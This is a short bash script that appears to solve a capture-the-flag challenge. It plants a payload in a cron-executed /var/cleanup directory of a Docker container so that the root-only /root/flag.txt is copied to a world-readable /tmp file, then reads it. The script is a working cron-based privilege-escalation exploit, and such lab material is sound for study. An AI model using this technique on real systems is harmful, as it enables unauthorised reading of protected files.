#!/usr/bin/env bash
set -euo pipefail

CONTAINER="challenge9"

# 1) Drop a malicious script in /var/cleanup that exfiltrates the flag
read -r -d '' PAYLOAD <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
cat /root/flag.txt > /tmp/flag.out
chmod 644 /tmp/flag.out
EOF

# Copy payload into the container
tmpfile="$(mktemp)"
echo "$PAYLOAD" > "$tmpfile"
chmod +x "$tmpfile"
docker cp "$tmpfile" "$CONTAINER":/var/cleanup/grabflag.sh
rm -f "$tmpfile"

# 2) Wait for cron to run (up to ~90s)
echo "[i] Waiting for cron to run payload..."
for i in $(seq 1 18); do
  if docker exec "$CONTAINER" test -f /tmp/flag.out; then
    break
  fi
  sleep 5
done

# 3) Read the flag
docker exec "$CONTAINER" cat /tmp/flag.out
